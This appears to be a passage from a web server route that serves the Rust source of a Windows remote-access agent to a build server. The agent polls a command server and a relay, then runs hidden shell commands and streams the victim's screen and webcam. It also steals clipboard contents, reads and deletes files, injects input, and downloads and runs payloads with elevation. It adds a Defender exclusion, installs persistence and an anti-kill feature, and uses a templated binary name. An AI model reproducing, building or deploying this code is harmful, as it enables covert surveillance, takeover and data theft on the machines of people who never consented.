            let cols: Vec<&str> = line.split("\\",\\"").map(|s| s.trim_matches('"')).collect();
            if cols.len() >= 5 {
                let pid: i64 = cols[1].parse().unwrap_or(0);
                let mem_str: String = cols[4].chars().filter(|c| c.is_ascii_digit()).collect();
                let kb: f64 = mem_str.parse().unwrap_or(0.0);
                procs.push(json!({
                    "pid": pid,
                    "name": cols[0],
                    "memory_mb": kb / 1024.0,
                }));
            }
        }
        Ok(json!({ "processes": procs }))
    }
    #[cfg(not(windows))]
    { Ok(json!({ "processes": [] })) }
}

fn proc_kill(pid: i64) -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = Command::new("taskkill").args(["/F", "/PID", &pid.to_string()])
            .output().map_err(|e| e.to_string())?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
    }
    Ok(json!({ "killed": pid }))
}

fn powershell(script: &str) -> Result<String, String> {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        let out = Command::new("powershell")
            .args(["-NoProfile", "-NonInteractive", "-Command", script])
            .creation_flags(CREATE_NO_WINDOW)
            .output().map_err(|e| e.to_string())?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
        Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
    }
    #[cfg(not(windows))]
    { let _ = script; Err("powershell not available".into()) }
}

fn clipboard_get() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let text = powershell("Get-Clipboard")?;
        Ok(json!({ "text": text }))
    }
    #[cfg(not(windows))]
    { Err("clipboard not supported on this platform".into()) }
}

fn clipboard_set(text: &str) -> Result<Value, String> {
    #[cfg(windows)]
    {
        let escaped = text.replace("'", "''");
        powershell(&format!("Set-Clipboard -Value '{}'", escaped))?;
        Ok(json!({ "ok": true }))
    }
    #[cfg(not(windows))]
    { let _ = text; Err("clipboard not supported on this platform".into()) }
}

fn system_action(action: &str, payload: &Value) -> Result<Value, String> {
    match action {
        "system.shutdown" => {
            #[cfg(windows)]
            Command::new("shutdown").args(["/s", "/t", "5"]).status().map_err(|e| e.to_string())?;
            Ok(json!({ "ok": true }))
        }
        "system.restart" => {
            #[cfg(windows)]
            Command::new("shutdown").args(["/r", "/t", "5"]).status().map_err(|e| e.to_string())?;
            Ok(json!({ "ok": true }))
        }
        "system.lock" => {
            #[cfg(windows)]
            Command::new("rundll32.exe").arg("user32.dll,LockWorkStation")
                .status().map_err(|e| e.to_string())?;
            Ok(json!({ "ok": true }))
        }
        "system.notify" => {
            let msg = payload.get("message").and_then(|v| v.as_str()).unwrap_or("Notification");
            let title = payload.get("title").and_then(|v| v.as_str()).unwrap_or("Sentinel");
            #[cfg(windows)]
            {
                let script = format!(
                    "Add-Type -AssemblyName System.Windows.Forms; \
                     $n = New-Object System.Windows.Forms.NotifyIcon; \
                     $n.Icon = [System.Drawing.SystemIcons]::Information; \
                     $n.Visible = $true; \
                     $n.ShowBalloonTip(5000, '{}', '{}', 'Info'); \
                     Start-Sleep -Seconds 6; $n.Dispose()",
                    ps_escape(title), ps_escape(msg)
                );
                let _ = powershell(&script);
            }
            Ok(json!({ "ok": true, "message": msg }))
        }
        "system.volume.set" => {
            let level = payload.get("level").and_then(|v| v.as_f64()).unwrap_or(50.0).clamp(0.0, 100.0);
            #[cfg(windows)]
            {
                let script = format!(
                    "$w = New-Object -ComObject WScript.Shell; \
                     for($i=0;$i -lt 50;$i++) {{ $w.SendKeys([char]174) }}; \
                     $steps = [math]::Round({} / 2); \
                     for($i=0;$i -lt $steps;$i++) {{ $w.SendKeys([char]175) }}",
                    level
                );
                let _ = powershell(&script);
            }
            Ok(json!({ "ok": true, "level": level }))
        }
        "system.volume.mute" => {
            #[cfg(windows)]
            {
                let _ = powershell("(New-Object -ComObject WScript.Shell).SendKeys([char]173)");
            }
            Ok(json!({ "ok": true }))
        }
        "system.sound.play" => {
            let src = payload.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string();
            if src.is_empty() { return Err("missing url".into()); }
            #[cfg(windows)]
            {
                let local_path = if src.starts_with("http") {
                    let tmp = std::env::temp_dir().join("sentinel-sound.tmp");
                    download_to(&src, &tmp)?;
                    tmp.to_string_lossy().to_string()
                } else { src.clone() };
                let lower = local_path.to_lowercase();
                if lower.ends_with(".wav") {
                    let script = format!(
                        "(New-Object Media.SoundPlayer '{}').PlaySync()",
                        ps_escape(&local_path)
                    );
                    let _ = powershell(&script);
                } else {
                    let script = format!(
                        "$p = New-Object -ComObject WMPlayer.OCX; \
                         $p.URL = '{}'; \
                         $p.controls.play(); \
                         while ($p.playState -ne 1) {{ Start-Sleep -Milliseconds 200 }}",
                        ps_escape(&local_path)
                    );
                    let _ = powershell(&script);
                }
            }
            Ok(json!({ "ok": true, "src": src }))
        }
        "system.launch_file" => {
            let url = payload.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let filename = payload.get("filename").and_then(|v| v.as_str()).unwrap_or("agent-payload.bin").to_string();
            let args_str = payload.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let elevated = payload.get("elevated").and_then(|v| v.as_bool()).unwrap_or(false);
            if url.is_empty() { return Err("missing url".into()); }
            let safe_name: String = filename.chars()
                .filter(|c| c.is_alphanumeric() || *c == '.' || *c == '-' || *c == '_')
                .collect();
            let safe_name = if safe_name.is_empty() { "agent-payload.bin".into() } else { safe_name };
            let dest = std::env::temp_dir().join(&safe_name);
            download_to(&url, &dest)?;
            let dest_s = dest.to_string_lossy().to_string();
            log!("launch_file -> {} (args: {})", dest_s, args_str);
            #[cfg(windows)]
            {
                use std::os::windows::process::CommandExt;
                const CREATE_NEW_CONSOLE: u32 = 0x0000_0010;
                const DETACHED_PROCESS: u32 = 0x0000_0008;
                let lower = dest_s.to_lowercase();
                let result: Result<(), String> = if elevated {
                    let script = format!(
                        "Start-Process -FilePath '{}' -ArgumentList '{}' -Verb RunAs",
                        ps_escape(&dest_s), ps_escape(&args_str)
                    );
                    powershell(&script).map(|_| ())
                } else if lower.ends_with(".ps1") {
                    Command::new("powershell")
                        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", &dest_s])
                        .creation_flags(DETACHED_PROCESS)
                        .spawn().map(|_| ()).map_err(|e| e.to_string())
                } else if lower.ends_with(".bat") || lower.ends_with(".cmd") {
                    Command::new("cmd")
                        .args(["/C", "start", "", &dest_s, &args_str])
                        .creation_flags(CREATE_NEW_CONSOLE)
                        .spawn().map(|_| ()).map_err(|e| e.to_string())
                } else {
                    let mut c = Command::new(&dest_s);
                    if !args_str.is_empty() { c.args(args_str.split_whitespace()); }
                    c.creation_flags(DETACHED_PROCESS).spawn().map(|_| ()).map_err(|e| e.to_string())
                };
                result?;
            }
            Ok(json!({ "ok": true, "path": dest_s, "url": url }))
        }
        "system.run_script" => {
            let script = payload.get("script").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let lang = payload.get("lang").and_then(|v| v.as_str()).unwrap_or("powershell");
            if script.is_empty() { return Err("empty script".into()); }
            #[cfg(windows)]
            {
                use std::os::windows::process::CommandExt;
                const CREATE_NO_WINDOW: u32 = 0x0800_0000;
                let out = if lang == "cmd" {
                    Command::new("cmd").args(["/C", &script])
                        .creation_flags(CREATE_NO_WINDOW)
                        .output()
                } else {
                    Command::new("powershell")
                        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &script])
                        .creation_flags(CREATE_NO_WINDOW)
                        .output()
                };
                let out = out.map_err(|e| e.to_string())?;
                Ok(json!({
                    "stdout": truncate(String::from_utf8_lossy(&out.stdout).to_string(), 200_000),
                    "stderr": truncate(String::from_utf8_lossy(&out.stderr).to_string(), 200_000),
                    "exit_code": out.status.code().unwrap_or(-1),
                }))
            }
            #[cfg(not(windows))]
            { let _ = lang; Ok(json!({"stdout": "", "stderr": "non-windows", "exit_code": -1})) }
        }
        _ => Err(format!("unknown system action: {}", action)),
    }
}

fn ps_escape(s: &str) -> String { s.replace('\\'', "''") }

fn download_to(url: &str, path: &PathBuf) -> Result<(), String> {
    let resp = http().get(url).call().map_err(|e| e.to_string())?;
    let mut reader = resp.into_reader();
    let mut buf = Vec::with_capacity(64 * 1024);
    std::io::Read::read_to_end(&mut reader, &mut buf).map_err(|e| e.to_string())?;
    fs::write(path, buf).map_err(|e| e.to_string())?;
    Ok(())
}

fn handle_command(
    cfg: &Config,
    streaming: &Arc<AtomicBool>,
    cam_streaming: &Arc<AtomicBool>,
    stream_cfg: &Arc<Mutex<StreamConfig>>,
    cmd: &Value,
) -> (String, Result<Value, String>) {
    let id = cmd.get("id").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let action = cmd.get("action").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let payload = cmd.get("payload").cloned().unwrap_or(Value::Null);
    log!("cmd: {} ({})", action, id);

    let result: Result<Value, String> = match action.as_str() {
        "screen.capture" => {
            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
            capture_jpeg(q).and_then(|(jpg, w, h)| {
                let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                push_screen(cfg, &b64)?;
                Ok(json!({ "width": w, "height": h, "bytes": jpg.len() }))
            })
        }
        "screen.stream.start" => {
            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
            let f = payload.get("fps").and_then(|v| v.as_u64()).unwrap_or(30) as u32;
            if let Ok(mut sc) = stream_cfg.lock() {
                sc.quality = q;
                sc.fps_cap = f.clamp(1, 60);
            }
            streaming.store(true, Ordering::SeqCst);
            Ok(json!({"streaming": true, "quality": q, "fps": f}))
        }
        "screen.stream.stop" => { streaming.store(false, Ordering::SeqCst); Ok(json!({"streaming": false})) }
        "screen.webrtc.start" => {
            let session = payload.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let ice = payload.get("ice_servers").cloned().unwrap_or(Value::Null);
            if session.is_empty() {
                Err("missing session id".into())
            } else {
                webrtc::start_session(&cfg.device_id, &cfg.device_token, &session, &ice)
                    .map(|_| json!({ "accepted": true, "session": session }))
            }
        }
        "screen.webrtc.stop" => {
            let session = payload.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
            webrtc::stop_session(&session);
            Ok(json!({ "stopped": true, "session": session }))
        }
        "camera.capture" => {
            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(65) as u8;
            capture_camera_jpeg(q).and_then(|jpg| {
                let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                push_camera(cfg, &b64)?;
                Ok(json!({ "bytes": jpg.len() }))
            })
        }
        "camera.stream.start" => { cam_streaming.store(true, Ordering::SeqCst); Ok(json!({"streaming": true})) }
        "camera.stream.stop"  => { cam_streaming.store(false, Ordering::SeqCst); Ok(json!({"streaming": false})) }
        "shell.exec" => {
            let c = payload.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            if c.is_empty() { Err("empty cmd".into()) } else { Ok(run_shell(c)) }
        }
        "fs.list"   => fs_list(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.read"   => fs_read(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.delete" => fs_delete(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "proc.list" => proc_list(),
        "proc.kill" => proc_kill(payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0)),
        "clipboard.get" => clipboard_get(),
        "clipboard.set" => clipboard_set(payload.get("text").and_then(|v| v.as_str()).unwrap_or("")),
        "input.lock" => {
            let locked = payload.get("locked").and_then(|v| v.as_bool()).unwrap_or(false);
            input_lock(locked)
        }
        "input.mouse" => {
            let event = payload.get("event").and_then(|v| v.as_str()).unwrap_or("");
            mouse_action(event, &payload)
        }
        "input.key" => key_action(&payload),
        "overlay.draw" | "overlay.clear" => {
            // Draw overlay is rendered client-side only — agent acknowledges
            Ok(json!({ "ok": true }))
        }
        "ping" => Ok(json!({ "pong": true })),
        "startup.status" => {
            #[cfg(windows)]
            { Ok(load_persistence_paths()) }
            #[cfg(not(windows))]
            { Ok(json!({"entries": []})) }
        }
        "startup.enable" => Ok(install_startup()),
        "startup.disable" => Ok(uninstall_startup()),
        "antikill.enable" => Ok(install_antikill()),
        "antikill.disable" => Ok(uninstall_antikill()),
        a if a.starts_with("system.") => system_action(a, &payload),
        _ => Err(format!("unknown action: {}", action)),
    };

    match &result {
        Ok(v)  => send_result(cfg, &id, true, v.clone(), None),
        Err(e) => send_result(cfg, &id, false, Value::Null, Some(e.clone())),
    }

    (action, result)
}

// ---------- HidenHost relay handler ----------

fn handle_relay_command(
    cfg: &Config,
    streaming: &Arc<AtomicBool>,
    cam_streaming: &Arc<AtomicBool>,
    stream_cfg: &Arc<Mutex<StreamConfig>>,
    relay_tx: &tokio::sync::mpsc::Sender<signaling::Signal>,
    msg: &Value,
) {
    let msg_type = msg.get("type").and_then(|v| v.as_str()).unwrap_or("");
    let payload = msg.get("payload").cloned().unwrap_or(Value::Null);

    match msg_type {
        "cmd" => {
            let action = payload.get("action").and_then(|v| v.as_str()).unwrap_or("").to_string();
            log!("relay cmd: {}", action);

            match action.as_str() {
                "screen.stream.start" => {
                    let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
                    let f = payload.get("fps").and_then(|v| v.as_u64()).unwrap_or(30) as u32;
                    if let Ok(mut sc) = stream_cfg.lock() {
                        sc.quality = q;
                        sc.fps_cap = f.clamp(1, 60);
                    }
                    streaming.store(true, Ordering::SeqCst);
                }
                "screen.stream.stop" => {
                    streaming.store(false, Ordering::SeqCst);
                }
                "camera.stream.start" => {
                    cam_streaming.store(true, Ordering::SeqCst);
                }
                "camera.stream.stop" => {
                    cam_streaming.store(false, Ordering::SeqCst);
                }
                "screen.capture" => {
                    let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
                    if let Ok((jpg, _w, _h)) = capture_jpeg(q) {
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                        let _ = relay_tx.try_send(signaling::Signal {
                            event: "screen-frame".to_string(),
                            payload: json!({ "jpeg_b64": b64 }),
                        });
                    }
                }
                "camera.capture" => {
                    let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(65) as u8;
                    if let Ok(jpg) = capture_camera_jpeg(q) {
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                        let _ = relay_tx.try_send(signaling::Signal {
                            event: "camera-frame".to_string(),
                            payload: json!({ "camera_b64": b64 }),
                        });
                    }
                }
                "shell.exec" => {
                    let c = payload.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
                    if !c.is_empty() {
                        let result = run_shell(c);
                        let _ = relay_tx.try_send(signaling::Signal {
                            event: "result".to_string(),
                            payload: json!({ "action": "shell.exec", "ok": true, "result": result }),
                        });
                    }
                }
                "clipboard.get" => {
                    match clipboard_get() {
                        Ok(v) => {
                            let _ = relay_tx.try_send(signaling::Signal {
                                event: "result".to_string(),
                                payload: json!({ "action": "clipboard.get", "ok": true, "result": v }),
                            });
                        }
                        Err(e) => {
                            let _ = relay_tx.try_send(signaling::Signal {
                                event: "result".to_string(),
                                payload: json!({ "action": "clipboard.get", "ok": false, "error": e }),
                            });
                        }
                    }
                }
                "clipboard.set" => {
                    let text = payload.get("text").and_then(|v| v.as_str()).unwrap_or("");
                    let _ = clipboard_set(text);
                }
                "input.mouse" => {
                    let event = payload.get("event").and_then(|v| v.as_str()).unwrap_or("");
                    let _ = mouse_action(event, &payload);
                }
                "input.key" => {
                    let _ = key_action(&payload);
                }
                "input.lock" => {
                    let locked = payload.get("locked").and_then(|v| v.as_bool()).unwrap_or(false);
                    let _ = input_lock(locked);
                }
                "overlay.draw" | "overlay.clear" => {
                    // Client-side only
                }
                _ => {
                    let cmd = json!({
                        "id": "",
                        "action": action,
                        "payload": payload,
                    });
                    handle_command(cfg, streaming, cam_streaming, stream_cfg, &cmd);
                }
            }
        }
        _ => {}
    }
}

// ---------- main ----------

fn main() {
    // If marked as require_admin and we're not elevated, relaunch elevated via PowerShell.
    #[cfg(windows)]
    {
        if binding::REQUIRE_ADMIN && !is_elevated() {
            if relaunch_elevated() {
                std::process::exit(0);
            }
        }
        if binding::WD_EXCLUSION {
            let _ = add_defender_exclusion();
        }
    }

    let args: Vec<String> = std::env::args().collect();
    let server_override = std::env::var("SENTINEL_SERVER_URL").ok()
        .or_else(|| args.iter().position(|a| a == "--server").and_then(|i| args.get(i + 1).cloned()));

    let cfg = match load_config() {
        Some(c) if !is_stale_server_url(&c.server) => {
            log!("loaded existing config for device {}", c.device_id);
            c
        }
        _ => {
            let server = server_override.unwrap_or_else(|| DEFAULT_SERVER.to_string());
            log!("first run — auto-registering at {}", server);
            loop {
                match auto_register(&server) {
                    Ok(c) => { log!("registered as {}", c.device_id); break c; }
                    Err(e) => { log!("register failed: {} — retry in 10s", e); thread::sleep(Duration::from_secs(10)); }
                }
            }
        }
    };

    let _ = STARTED.elapsed();

    if binding::ANTIKILL { let _ = install_antikill(); }
    if STARTUP_FLAG { let _ = install_startup(); }

    let cfg = Arc::new(cfg);
    let streaming = Arc::new(AtomicBool::new(false));
    let cam_streaming = Arc::new(AtomicBool::new(false));
    let stream_cfg = Arc::new(Mutex::new(StreamConfig::default()));

    // Heartbeat thread (every 5s)
    {
        let cfg = cfg.clone();
        thread::spawn(move || loop {
            heartbeat(&cfg);
            thread::sleep(Duration::from_secs(5));
        });
    }

    // HidenHost relay thread
    let relay_tx_shared: Arc<Mutex<Option<tokio::sync::mpsc::Sender<signaling::Signal>>>> = Arc::new(Mutex::new(None));
    {
        let cfg = cfg.clone();
        let streaming = streaming.clone();
        let cam_streaming = cam_streaming.clone();
        let stream_cfg = stream_cfg.clone();
        let relay_tx_shared = relay_tx_shared.clone();
        thread::spawn(move || {
            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .expect("relay runtime");
            rt.block_on(async {
                loop {
                    log!("connecting to HidenHost relay…");
                    match hiden::spawn(cfg.device_id.clone()).await {
                        Ok((tx, mut rx)) => {
                            log!("HidenHost relay connected");
                            {
                                let mut guard = relay_tx_shared.lock().unwrap();
                                *guard = Some(tx.clone());
                            }

                            while let Some(sig) = rx.recv().await {
                                let msg = json!({
                                    "type": sig.event,
                                    "payload": sig.payload,
                                });
                                handle_relay_command(&cfg, &streaming, &cam_streaming, &stream_cfg, &tx, &msg);
                            }

                            log!("HidenHost relay disconnected");
                            {
                                let mut guard = relay_tx_shared.lock().unwrap();
                                *guard = None;
                            }
                        }
                        Err(e) => {
                            log!("HidenHost relay connect error: {}", e);
                        }
                    }
                    tokio::time::sleep(Duration::from_secs(3)).await;
                }
            });
        });
    }

    // Screen-stream thread — reads quality/fps from stream_cfg
    {
        let cfg = cfg.clone();
        let streaming = streaming.clone();
        let stream_cfg = stream_cfg.clone();
        let relay_tx_shared = relay_tx_shared.clone();
        thread::spawn(move || {
            loop {
                if streaming.load(Ordering::SeqCst) {
                    let (q, interval_ms) = {
                        let sc = stream_cfg.lock().unwrap();
                        (sc.quality, (1000u64).checked_div(sc.fps_cap as u64).unwrap_or(33))
                    };
                    let res = capture_jpeg(q).and_then(|(jpg, _w, _h)| {
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);

                        let sent_via_relay = {
                            if let Ok(guard) = relay_tx_shared.lock() {
                                if let Some(tx) = guard.as_ref() {
                                    tx.try_send(signaling::Signal {
                                        event: "frame".to_string(),
                                        payload: json!({ "jpeg_b64": b64 }),
                                    }).is_ok()
                                } else { false }
                            } else { false }
                        };

                        if !sent_via_relay {
                            push_screen(&cfg, &b64)?;
                        }
                        Ok(())
                    });
                    if let Err(e) = res {
                        log!("stream err: {}", e);
                        thread::sleep(Duration::from_secs(2));
                    } else {
                        thread::sleep(Duration::from_millis(interval_ms.max(16)));
                    }
                } else {
                    thread::sleep(Duration::from_millis(800));
                }
            }
        });
    }

    // Camera-stream thread
    {
        let cfg = cfg.clone();
        let cam_streaming = cam_streaming.clone();
        let relay_tx_shared = relay_tx_shared.clone();
        thread::spawn(move || {
            loop {
                if cam_streaming.load(Ordering::SeqCst) {
                    let res = capture_camera_jpeg(65).and_then(|jpg| {
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);

                        let sent_via_relay = {
                            if let Ok(guard) = relay_tx_shared.lock() {
                                if let Some(tx) = guard.as_ref() {
                                    tx.try_send(signaling::Signal {
                                        event: "camera-frame".to_string(),
                                        payload: json!({ "camera_b64": b64 }),
                                    }).is_ok()
                                } else { false }
                            } else { false }
                        };

                        if !sent_via_relay {
                            push_camera(&cfg, &b64)?;
                        }
                        Ok(())
                    });
                    if let Err(e) = res {
                        log!("cam err: {}", e);
                        thread::sleep(Duration::from_secs(3));
                    } else {
                        thread::sleep(Duration::from_millis(250));
                    }
                } else {
                    thread::sleep(Duration::from_millis(800));
                }
            }
        });
    }

    // Main poll loop
    loop {
        let cmds = poll(&cfg);
        for c in cmds {
            let cfg = cfg.clone();
            let streaming = streaming.clone();
            let cam_streaming = cam_streaming.clone();
            let stream_cfg = stream_cfg.clone();
            thread::spawn(move || {
                let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                    handle_command(&cfg, &streaming, &cam_streaming, &stream_cfg, &c);
                }));
            });
        }
        thread::sleep(Duration::from_millis(1000));
    }
}
`

const signalingRs = `// Supabase Realtime (phoenix) signaling client for WebRTC offer/answer/ICE.

use anyhow::{anyhow, Result};
use futures_util::{SinkExt, StreamExt};
use serde_json::{json, Value};
use std::time::Duration;
use tokio::{
    sync::mpsc::{Receiver, Sender},
    time,
};
use tokio_tungstenite::{
    connect_async,
    tungstenite::{client::IntoClientRequest, Message},
};

use crate::binding::{SUPABASE_ANON_KEY, SUPABASE_URL};

pub struct Signal {
    pub event: String,
    pub payload: Value,
}

pub async fn spawn(device_id: String) -> Result<(Sender<Signal>, Receiver<Signal>)> {
    let host = SUPABASE_URL
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .trim_end_matches('/');
    let url = format!(
        "wss://{}/realtime/v1/websocket?apikey={}&vsn=1.0.0",
        host, SUPABASE_ANON_KEY
    );
    let req = url.as_str().into_client_request()?;
    let (ws, _resp) = connect_async(req).await?;
    let (mut write, mut read) = ws.split();

    let topic = format!("realtime:webrtc:{}", device_id);

    let join = json!({
        "topic": topic,
        "event": "phx_join",
        "payload": {
            "config": {
                "broadcast": { "self": false, "ack": false },
                "presence": { "key": "" }
            }
        },
        "ref": "1",
        "join_ref": "1"
    });
    write.send(Message::Text(join.to_string())).await?;

    let (out_tx, mut out_rx) = tokio::sync::mpsc::channel::<Signal>(32);
    let (in_tx, in_rx) = tokio::sync::mpsc::channel::<Signal>(32);

    let topic_w = topic.clone();
    tokio::spawn(async move {
        let mut ref_id: u64 = 2;
        let mut hb = time::interval(Duration::from_secs(25));
        hb.tick().await;
        loop {
            tokio::select! {
                msg = out_rx.recv() => {
                    let Some(sig) = msg else { break; };
                    let frame = json!({
                        "topic": topic_w,
                        "event": "broadcast",
                        "payload": {
                            "type": "broadcast",
                            "event": sig.event,
                            "payload": sig.payload,
                        },
                        "ref": ref_id.to_string(),
                        "join_ref": "1",
                    });
                    ref_id += 1;
                    if write.send(Message::Text(frame.to_string())).await.is_err() {
                        break;
                    }
                }
                _ = hb.tick() => {
                    let frame = json!({
                        "topic": "phoenix",
                        "event": "heartbeat",
                        "payload": {},
                        "ref": ref_id.to_string(),
                    });
                    ref_id += 1;
                    if write.send(Message::Text(frame.to_string())).await.is_err() {
                        break;
                    }
                }
            }
        }
        let _ = write.close().await;
    });

    tokio::spawn(async move {
        while let Some(msg) = read.next().await {
            let Ok(msg) = msg else { break; };
            let text = match msg {
                Message::Text(t) => t,
                Message::Binary(b) => match String::from_utf8(b) {
                    Ok(s) => s,
                    Err(_) => continue,
                },
                Message::Close(_) => break,
                _ => continue,
            };
            let Ok(v): Result<Value, _> = serde_json::from_str(&text) else { continue };
            if v.get("event").and_then(|e| e.as_str()) != Some("broadcast") {
                continue;
            }
            let payload = match v.get("payload") {
                Some(p) => p,
                None => continue,
            };
            let event = payload.get("event").and_then(|e| e.as_str()).unwrap_or("");
            let inner = payload.get("payload").cloned().unwrap_or(Value::Null);
            if event == "answer" || event == "ice" {
                let _ = in_tx
                    .send(Signal {
                        event: event.to_string(),
                        payload: inner,
                    })
                    .await;
            }
        }
    });

    let _ = device_id;
    Ok((out_tx, in_rx))
}

#[allow(dead_code)]
fn _silence_anyhow_warning() {
    let _: anyhow::Error = anyhow!("placeholder");
}
`

const webrtcRs = `// WebRTC placeholder — real WebRTC peer connections are not used.
// Screen/camera streaming goes through HidenHost relay (WSS) or HTTP polling.
// This module provides stub functions so the rest of main.rs compiles.

use serde_json::Value;

pub fn start_session(
    _device_id: &str,
    _device_token: &str,
    _session_id: &str,
    _ice_servers: &Value,
) -> Result<(), String> {
    Err("WebRTC not compiled in — use relay streaming instead".into())
}

pub fn stop_session(_session_id: &str) {}
`

const hidenRs = `// HidenHost relay client.

use anyhow::Result;
use futures_util::{SinkExt, StreamExt};
use serde_json::{json, Value};
use std::time::Duration;
use tokio::{
    sync::mpsc::{Receiver, Sender},
    time,
};
use tokio_tungstenite::{
    connect_async,
    tungstenite::{client::IntoClientRequest, Message},
};

use crate::binding::{HIDEN_AUTH_KEY, HIDEN_WS_URL};
use crate::signaling::Signal;

pub async fn spawn(device_id: String) -> Result<(Sender<Signal>, Receiver<Signal>)> {
    let url = format!(
        "{}/?key={}&role=agent&device={}",
        HIDEN_WS_URL,
        urlencode(HIDEN_AUTH_KEY),
        urlencode(&device_id),
    );
    let req = url.as_str().into_client_request()?;
    let (ws, _resp) = connect_async(req).await?;
    let (mut write, mut read) = ws.split();

    let hello = json!({
        "type": "hello",
        "role": "agent",
        "deviceId": device_id,
    });
    write.send(Message::Text(hello.to_string())).await?;

    let (out_tx, mut out_rx) = tokio::sync::mpsc::channel::<Signal>(64);
    let (in_tx, in_rx) = tokio::sync::mpsc::channel::<Signal>(64);

    tokio::spawn(async move {
        let mut hb = time::interval(Duration::from_secs(25));
        hb.tick().await;
        loop {
            tokio::select! {
                msg = out_rx.recv() => {
                    let Some(sig) = msg else { break; };
                    let frame = json!({
                        "type": sig.event,
                        "payload": sig.payload,
                    });
                    if write.send(Message::Text(frame.to_string())).await.is_err() {
                        break;
                    }
                }
                _ = hb.tick() => {
                    if write.send(Message::Ping(Vec::new())).await.is_err() {
                        break;
                    }
                }
            }
        }
        let _ = write.close().await;
    });

    tokio::spawn(async move {
        while let Some(msg) = read.next().await {
            let Ok(msg) = msg else { break; };
            let text = match msg {
                Message::Text(t) => t,
                Message::Binary(b) => match String::from_utf8(b) {
                    Ok(s) => s,
                    Err(_) => continue,
                },
                Message::Close(_) => break,
                _ => continue,
            };
            let Ok(v): Result<Value, _> = serde_json::from_str(&text) else { continue };
            let event = v.get("type").and_then(|e| e.as_str()).unwrap_or("");
            if event == "welcome" || event == "agent-online" || event == "viewer-joined"
                || event == "viewer-left" || event == "error"
            {
                continue;
            }
            let payload = v.get("payload").cloned().unwrap_or(Value::Null);
            let _ = in_tx
                .send(Signal {
                    event: event.to_string(),
                    payload,
                })
                .await;
        }
    });

    Ok((out_tx, in_rx))
}

fn urlencode(s: &str) -> String {
    s.bytes()
        .map(|b| match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                (b as char).to_string()
            }
            _ => format!("%{:02X}", b),
        })
        .collect()
}
`

const cargoToml = `[package]
name = "sentinel-agent"
version = "0.3.0"
edition = "2021"

[features]
default = []
windowed = []

[[bin]]
name = "{{BUILD_NAME}}"
path = "src/main.rs"

[dependencies]
ureq = { version = "2.10", features = ["json"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
base64 = "0.22"
gethostname = "0.5"
whoami = "1.5"
tokio = { version = "1", features = ["rt-multi-thread", "macros", "sync", "time", "net", "io-util"] }
anyhow = "1"
futures-util = "0.3"
tokio-tungstenite = { version = "0.21", features = ["rustls-tls-native-roots"] }

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
strip = true
panic = "abort"
`

async function verifyBuildserverKey(request: Request): Promise<boolean> {
  const key = request.headers.get('x-buildserver-key')
  if (!key) return false
  const { data } = await supabaseAdmin
    .from('build_server_config')
    .select('id')
    .eq('key', key)
    .maybeSingle()
  return !!data
}

export const Route = createFileRoute('/api/public/buildserver/stub')({
  server: {
    handlers: {
      GET: async ({ request }) => {
        if (!(await verifyBuildserverKey(request))) {
          return new Response('Unauthorized', { status: 401 })
        }

        const files: Record<string, string> = {
          'Cargo.toml': cargoToml,
          'src/main.rs': mainRs,
          'src/binding.rs': bindingRs,
          'src/signaling.rs': signalingRs,
          'src/webrtc.rs': webrtcRs,
          'src/hiden.rs': hidenRs,
        }

        return new Response(JSON.stringify({ files, language: 'rust' }), {
          headers: { 'Content-Type': 'application/json' },
        })
      },
    },
  },
})
